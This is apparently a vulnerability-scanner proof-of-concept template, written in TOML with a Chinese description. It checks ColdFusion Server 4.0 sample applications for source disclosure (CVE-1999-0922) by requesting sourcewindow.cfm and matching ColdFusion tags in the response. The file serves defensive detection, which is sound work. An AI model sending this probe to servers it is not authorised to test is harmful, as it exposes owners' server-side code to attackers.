[info]
author = "ave"
description = "检测 ColdFusion Server 4.0 示例应用中的 sourcewindow.cfm 文件是否存在源代码泄露，远程攻击者可通过直接访问该文件获取服务器端脚本源码。"
id = "POC-AVE-1999-0722"
name = "ColdFusion Server 4.0 源代码泄露漏洞 PoC"
severity = "medium"
tags = ["cve-1999-0922"]
vuln_id = [
    "CVE-1999-0922",
    "AVE-1999-0722",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/sourcewindow.cfm"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<CF",
    "cfscript",
    "cfoutput",
]
